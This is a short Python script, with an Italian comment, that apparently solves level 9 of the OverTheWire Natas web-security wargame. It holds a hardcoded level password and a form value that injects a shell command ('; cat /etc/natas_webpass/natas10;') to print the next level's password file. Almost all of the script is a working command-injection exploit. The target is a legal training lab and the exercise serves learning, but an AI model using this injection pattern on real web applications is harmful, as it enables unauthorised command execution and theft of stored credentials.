#!/bin/python3
# Abbiamo iniettato nell'input comandi per farci stampare la password del livello successivo
import requests

user = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = 'http://%s.natas.labs.overthewire.org/' % user
obj = {'needle': 'aaaa dictionary.txt; echo ""; cat /etc/natas_webpass/natas10; top ', 'submit': 'submit'}

post = requests.post(url, data=obj, auth=(user, password))

print(post.text)
